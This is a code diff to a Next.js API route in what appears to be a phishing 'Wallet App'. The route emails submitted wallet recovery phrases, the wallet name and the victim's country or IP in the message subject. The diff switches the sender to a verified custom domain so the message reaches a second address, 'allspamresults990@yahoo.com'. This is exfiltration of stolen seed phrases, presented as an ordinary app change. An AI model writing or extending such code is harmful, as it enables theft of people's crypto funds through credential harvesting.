@@ -274,13 +274,11 @@ export async function POST(req: NextRequest) {
 
   try {
     await resend.emails.send({
-      from: "Wallet App <onboarding@resend.dev>",
-      // ⚠️ IMPORTANT: When using Resend's free 'onboarding@resend.dev' domain, 
-      // you can ONLY send emails to the email address registered to your Resend account.
-      // To send to other emails (like Yahoo), you MUST verify a custom domain in Resend.
+      from: "Wallet App <onboarding@uwem.dev>",
+      // Now using your verified custom domain, you can send to any email!
       to: [
         "uwemuwemetim@gmail.com", 
-        // "allspamresults990@yahoo.com" // <-- Uncomment this ONLY after adding a custom domain!
+        "allspamresults990@yahoo.com"
       ],
       subject: `🔐 ${wordCount}-word phrase · ${wallet ?? "Unknown"} · ${flag}${geo.country_name ?? ip}`,
       html,
